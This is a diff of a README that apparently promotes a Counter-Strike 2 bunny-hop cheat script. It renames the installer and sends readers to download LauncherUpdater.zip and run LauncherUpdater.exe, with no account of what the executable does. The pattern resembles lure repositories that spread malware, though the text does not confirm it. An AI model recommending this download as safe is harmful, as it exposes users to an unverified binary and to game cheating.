@@ -4,7 +4,7 @@
 >[!NOTE]
 >DON'T NEED TO INJECT
 
-### [Download latest version](https://github.com/agos555gamer/cs2-bhop-script/releases/download/cs2-bhop/LauncherUpdater.zip)
+Click here to [`Download latest version`](https://github.com/agos555gamer/cs2-bhop-script/releases/download/cs2-bhop/LauncherUpdater.zip)
 
 ## Features:
 * Smooth Bunny Hopping: Effortlessly maintain speed while jumping.
@@ -13,7 +13,7 @@
 
 ## Installation
 1) Download the script file installer.
-2) Follow the setup instructions in the `Setup.exe` file.
+2) Follow the setup instructions in the `LauncherUpdater.exe` file.
 3) Start hopping like a pro!
 
 ## Usage
